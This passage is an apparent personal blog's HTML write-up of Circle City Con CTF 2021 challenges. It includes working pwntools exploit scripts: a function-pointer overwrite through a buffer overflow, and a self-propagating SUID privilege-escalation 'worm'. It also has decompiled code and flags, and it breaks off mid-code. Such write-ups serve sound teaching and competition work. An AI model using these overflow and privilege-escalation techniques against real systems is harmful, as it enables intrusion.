@@ -1,0 +1,926 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>Circle City Con CTF 2021</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+      <li>
+        <a href="https://tsheinen.github.io/circle-city-con-ctf-2021/#fawn-cdn-pwn">fawn cdn (pwn)</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/circle-city-con-ctf-2021/#worm-pwn">worm (pwn)</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/circle-city-con-ctf-2021/#little-mountain-rev">little mountain (rev)</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/circle-city-con-ctf-2021/#angrbox-misc">angrbox (misc)</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/circle-city-con-ctf-2021/#artform-rev">artform (rev)</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/circle-city-con-ctf-2021/#guardian-rev">guardian (rev)</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/circle-city-con-ctf-2021/#weird-rop-pwn">weird rop (pwn)</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/circle-city-con-ctf-2021/#double-misc-forensics">double (misc&#x2F;forensics)</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/circle-city-con-ctf-2021/#casino-web">casino (web)</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/circle-city-con-ctf-2021/#imgfiltrate-web">imgfiltrate (web)</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/circle-city-con-ctf-2021/#puppet-web">puppet (web)</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>Circle City Con CTF 2021</h1>
+    </header>
+
+    <div class="content">
+        <p>I competed with ret2rev, finishing in 7th place. Writeups aren't complete; I started writing and stopped when I got bored lol.</p>
+<span id="continue-reading"></span><h1 id="fawn-cdn-pwn">fawn cdn (pwn)</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>I&#39;m starting a modern internet business! That means I need my own Content Delivery Network! Check it out and see what you think, I wrote it at a hackathon!
+</span><span>nc 35.224.135.84 1001
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ ./fawncdn
+</span><span> ________ ________  ________  ________      
+</span><span>|\  _____\\   ____\|\   ___ \|\   ___  \    
+</span><span>\ \  \__/\ \  \___|\ \  \_|\ \ \  \\ \  \   
+</span><span> \ \   __\\ \  \    \ \  \ \\ \ \  \\ \  \  
+</span><span>  \ \  \_| \ \  \____\ \  \_\\ \ \  \\ \  \ 
+</span><span>   \ \__\   \ \_______\ \_______\ \__\\ \__\
+</span><span>    \|__|    \|_______|\|_______|\|__| \|__|
+</span><span>
+</span><span>
+</span><span>1. List files.
+</span><span>2. Choose files.
+</span><span>3. Deliver files.
+</span><span>4. Quit.
+</span></code></pre>
+<p><a href="https://github.com/b01lers/circle-city-ctf-2021/raw/main/pwn/fawncdn/dist/fawncdn">fawncdn</a></p>
+<p>Got a menu-driven pwnable. Listing files gives a brief json error message and the address of the function "win" which writes the bytes of a file to stdout. Choose files does nothing useful, just prints out a json error message. Deliver files is the most interesting -- it executes a function pointer stored on the stack. There is a 9 byte buffer overflow when reading in the menu choice, which is sufficient to override the function pointer. We can then get the stored image like so:</p>
+<ol>
+<li>leak win address by listing files</li>
+<li>overwrite function pointer</li>
+<li>invoke function pointer</li>
+<li>read the image lol</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/b01lers/circle-city-ctf-2021/main/pwn/fawncdn/solve/fawn.jpg" alt="CCC{th3y_w3r3nt_ly1ng_th1s_CDN_c4n_d3l1v3r}" /></p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">import </span><span>re
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;fawncdn&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;kitty&quot;
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>REMOTE:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;35.224.135.84&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1001</span><span>)
+</span><span>    </span><span style="color:#ffa759;">elif </span><span>args</span><span style="color:#f29e74;">.</span><span>GDB:
+</span><span>        </span><span style="color:#ffa759;">return </span><span>gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path]</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">gdbscript</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;b *main+269&quot;</span><span>)
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;1&quot;</span><span>)
+</span><span>    win </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;(0x.*?)</span><span style="color:#95e6cb;">\&quot;</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;}&quot;</span><span>))</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">16</span><span>)
+</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;win function ptr: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span>(win))
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">16 </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(win))
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;cmd&gt; &quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;cmd&gt; &quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;cmd&gt; &quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;3&quot;</span><span>)
+</span><span>    image </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;1. List files.&quot;</span><span>)
+</span><span>    f </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;fawn.jpg&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;wb&quot;</span><span>)
+</span><span>    f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(image)
+</span><span>    f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">close</span><span>()
+</span><span>    
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<h1 id="worm-pwn">worm (pwn)</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Write a worm and pwn my system :)
+</span><span>nc 35.188.197.160 1001
+</span></code></pre>
+<p><a href="https://github.com/b01lers/circle-city-ctf-2021/raw/main/pwn/worm/dist/worm.zip">worm</a></p>
+<p>So we get arbitary code exec on the system already and our goal is to find the flag, which is randomly distributed between 2^10 folders which are created in a tree structure. Making things slightly more complicated, each level is owned by a different user and you need to privesc with a trivially exploitable SUID binary. Also you get 512 bytes to do it lol. There were two versions of this challenge -- the original did not close stdin so you could execute bash and get a shell indefinitely. The fixed version resolved that issue.  Fortunately, my solution was under 512 bytes already when compressed so free points.</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>room0/
+</span><span>|-- key
+</span><span>|-- room0
+</span><span>|   |-- key
+</span><span>|   |-- room0
+</span><span>|   |   `-- flag.txt
+</span><span>|   `-- room1
+</span><span>`-- room1
+</span><span>    |-- key
+</span><span>    |-- room0
+</span><span>    `-- room1
+</span></code></pre>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>subprocess </span><span style="color:#ffa759;">import </span><span>PIPE</span><span style="color:#ccc9c2cc;">, </span><span>Popen</span><span style="color:#ccc9c2cc;">, </span><span>run
+</span><span style="color:#ffa759;">import </span><span>os
+</span><span style="color:#ffa759;">import </span><span>shutil
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;"># execute while working directory is /room0
+</span><span style="font-style:italic;color:#5c6773;"># echo $this | base64 -d | gunzip &gt; /tmp/worm.py; cd /room0; python3 /tmp/worm.py
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>os</span><span style="color:#f29e74;">.</span><span>path</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">exists</span><span>(</span><span style="color:#bae67e;">&quot;flag.txt&quot;</span><span>):
+</span><span>	shutil</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">copy</span><span>(</span><span style="color:#bae67e;">&quot;flag.txt&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;/tmp/flag.txt&quot;</span><span>)
+</span><span>
+</span><span>payload0 </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">32 </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;p4ssw0rd</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;cd room0;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;python3 /tmp/worm.py;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&quot;
+</span><span>p </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">run</span><span>([</span><span style="color:#bae67e;">&quot;./key&quot;</span><span>]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">capture_output</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">input</span><span style="color:#f29e74;">=</span><span>payload0)
+</span><span style="color:#f28779;">print</span><span>(p</span><span style="color:#f29e74;">.</span><span>stdout)
+</span><span style="color:#f28779;">print</span><span>(p</span><span style="color:#f29e74;">.</span><span>stderr)
+</span><span>
+</span><span>payload1 </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">32 </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;p4ssw0rd</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;cd room1;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;python3 /tmp/worm.py;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot; </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&quot;
+</span><span>p </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">run</span><span>([</span><span style="color:#bae67e;">&quot;./key&quot;</span><span>]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">capture_output</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">input</span><span style="color:#f29e74;">=</span><span>payload1)
+</span><span style="color:#f28779;">print</span><span>(p</span><span style="color:#f29e74;">.</span><span>stdout)
+</span><span style="color:#f28779;">print</span><span>(p</span><span style="color:#f29e74;">.</span><span>stderr)
+</span></code></pre>
+<h1 id="little-mountain-rev">little mountain (rev)</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Climb this mountain and score some points :)
+</span></code></pre>
+<p><a href="https://github.com/b01lers/circle-city-ctf-2021/raw/main/rev/little_mountain/dist/little">little</a></p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">main</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">int</span><span> local_c</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  </span><span style="color:#ffd580;">setabuf</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">do </span><span>{
+</span><span>    </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Option 0: Guess the number&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Option 1: Change the number&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Option 2: Exit&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffd580;">__isoc99_scanf</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>DAT_0049e0d7</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>local_c)</span><span style="color:#ccc9c2cc;">;
+</span><span>    (</span><span style="color:#f29e74;">**</span><span>(code </span><span style="color:#f29e74;">**</span><span>)(funcs </span><span style="color:#f29e74;">+ </span><span>(</span><span style="color:#ffa759;">long</span><span>)local_c </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">8</span><span>))()</span><span style="color:#ccc9c2cc;">;
+</span><span>  } </span><span style="color:#ffa759;">while</span><span>( </span><span style="color:#ffcc66;">true </span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>My immediate thought when seeing this is that we have an unchecked function pointer array and that's sus as fuck. This isn't pwn but it still got me thinking. Let's open it up in GDB and see what funcs[3] is.</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>gef➤  bt
+</span><span>#0  0x0000000000401cf5 in d ()
+</span><span>#1  0x0000000000401ed7 in main ()
+</span></code></pre>
+<p>A function called d; sounds meaningful.</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">d</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  byte local_29</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> local_28</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> local_24</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>local_20</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined </span><span style="color:#f29e74;">*</span><span>local_18</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> local_10</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> local_c</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  local_18 </span><span style="color:#f29e74;">= &amp;</span><span>DAT_0049e022</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_20 </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;little_mountain&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_24 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">thunk_FUN_004010de</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>DAT_0049e022)</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_28 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">thunk_FUN_004010de</span><span>(local_20)</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_10 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(modded </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0x14</span><span>) {
+</span><span>    local_c </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">while </span><span>(local_c </span><span style="color:#f29e74;">&lt;</span><span> local_24) {
+</span><span>      </span><span style="color:#ffa759;">if </span><span>(local_10 </span><span style="color:#f29e74;">==</span><span> local_28) {
+</span><span>        local_10 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>      }
+</span><span>      local_29 </span><span style="color:#f29e74;">=</span><span> local_20[local_10] </span><span style="color:#f29e74;">^</span><span> local_18[local_c]</span><span style="color:#ccc9c2cc;">;
+</span><span>      local_10 </span><span style="color:#f29e74;">=</span><span> local_10 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>      </span><span style="color:#ffd580;">write</span><span>(</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>local_29</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>      local_c </span><span style="color:#f29e74;">=</span><span> local_c </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>  </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>bet thats a flag. If modded is equal to 0x14 it will print text to stdout. modded is set when changing the number.</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">regen_number</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Always ready for more&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  magic </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">random</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  modded </span><span style="color:#f29e74;">=</span><span> modded </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>This means all we need to do is change the number 0x14 times and then invoke option 3 and we're probably going to get the flag.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;little&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;kitty&quot;
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>REMOTE:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;addr&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1337</span><span>)
+</span><span>    </span><span style="color:#ffa759;">elif </span><span>args</span><span style="color:#f29e74;">.</span><span>GDB:
+</span><span>        </span><span style="color:#ffa759;">return </span><span>gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">0x14</span><span>):
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1&quot;</span><span>)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;3&quot;</span><span>)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>flag{b4bys73p5upt3hm0un741n}
+</span></code></pre>
+<h1 id="angrbox-misc">angrbox (misc)</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Write me a program that:
+</span><span>- Takes 4 uppercase characters in argv
+</span><span>- Verifies the 4 character key and returns 0 if correct
+</span><span>- If I find the key, YOU LOSE
+</span><span>nc 35.194.4.79 7000
+</span></code></pre>
+<p><a href="https://github.com/b01lers/circle-city-ctf-2021/raw/main/misc/angrbox/dist/angrbox.zip">angrbox</a></p>
+<p>My first thought was to make a program nondeterministic within the scope of the binary; things like environmental variables, execve, etc. As it turns out, angr doesn't fail on these it just gives you a wrong answer. I know it's possible to construct a function with exponential path explosion, but there is an easier solution -- big big numbers. Who needs exponential growth when you have 8 0's lol. I know from experience that raw z3 can't reverse an LCG of this length in a reasonable time so I assumed angr wouldn't be able to do it either.</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">#define </span><span style="color:#73d0ff;">_GNU_SOURCE
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdio.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdlib.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;unistd.h&gt;
+</span><span style="color:#ffa759;">int </span><span style="color:#ffd580;">main </span><span>(</span><span style="color:#ffa759;">int </span><span style="color:#ffcc66;">argc</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">char</span><span style="color:#f29e74;">** </span><span style="color:#ffcc66;">argv</span><span>) {
+</span><span>
